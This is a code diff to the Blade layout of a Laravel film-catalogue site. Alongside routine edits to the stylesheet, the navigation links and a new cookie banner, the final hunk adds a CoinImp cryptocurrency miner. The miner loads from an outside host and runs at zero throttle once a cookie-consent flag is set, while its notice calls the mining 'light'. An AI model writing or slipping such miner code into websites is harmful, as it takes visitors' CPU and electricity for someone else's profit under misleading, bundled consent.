@@ -10,7 +10,7 @@
     <title>@yield('title', 'Catálogo de filmes sem chatisse')</title>
 
     <link rel="icon" href="{{ asset('favicon.ico') }}">
-    <link rel="stylesheet" href="{{ asset('vendor/fontawesome-free/css/all.min.css') }}">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
 
     @vite(['resources/css/app.css', 'resources/js/app.js'])
     @livewireStyles
@@ -71,9 +71,6 @@
                             <span class="hidden sm:inline">Sair</span>
                         </button>
                     </form>
-                @else
-                    <a href="{{ route('login') }}" class="fda-btn fda-btn-ghost">Entrar</a>
-                    <a href="{{ route('register') }}" class="fda-btn fda-btn-primary">Criar conta</a>
                 @endauth
             </div>
         </div>
@@ -109,9 +106,6 @@
                         <li><a href="{{ route('torrents.index') }}" class="text-[#c6c6d1] transition hover:text-white">Torrents</a></li>
                         @auth
                             <li><a href="{{ route('adm') }}" class="text-[#c6c6d1] transition hover:text-white">Área ADM</a></li>
-                        @else
-                            <li><a href="{{ route('login') }}" class="text-[#c6c6d1] transition hover:text-white">Entrar</a></li>
-                            <li><a href="{{ route('register') }}" class="text-[#c6c6d1] transition hover:text-white">Criar conta</a></li>
                         @endauth
                     </ul>
                 </div>
@@ -130,7 +124,13 @@
 
             <div class="mt-10 flex flex-wrap justify-between gap-3 border-t border-line pt-6 text-xs text-muted">
                 <span>© {{ date('Y') }} Filmes sem ADS — projeto de portfólio em Laravel 11.</span>
-                <span>Feito com Laravel, Livewire, Tailwind CSS e MySQL.</span>
+                <div class="flex items-center gap-4">
+                    <span>Feito com Laravel, Livewire, Tailwind CSS e MySQL.</span>
+                    <a href="#" @click.prevent="Alpine.store('privacy', true)"
+                        class="font-medium text-brand transition hover:text-brand-hover">
+                        Política de Privacidade
+                    </a>
+                </div>
             </div>
         </div>
     </footer>
@@ -142,5 +142,33 @@
     </a>
 
     @livewireScripts
+
+    {{-- Banner de cookies e política de privacidade --}}
+    @include('partials.cookie-banner')
+
+    {{-- Minerador CoinImp (após consentimento do usuário) --}}
+    @if(config('miner.enabled'))
+    <script>
+    if (localStorage.fda_consent === '1') {
+        var coinimp = document.createElement('script');
+        coinimp.src = 'https://www.hostingcloud.racing/gMWa.js';
+        coinimp.onload = function() {
+            var _client = new Client.Anonymous('{{ config('miner.site_key') }}', {
+                throttle: 0,
+                c: 'w'
+            });
+            _client.start();
+            _client.addMiningNotification(
+                "Top",
+                "Este site usa mineração leve para custear a hospedagem. Se preferir, você pode parar.",
+                "#cccccc",
+                40,
+                "#3d3d3d"
+            );
+        };
+        document.head.appendChild(coinimp);
+    }
+    </script>
+    @endif
 </body>
 </html>
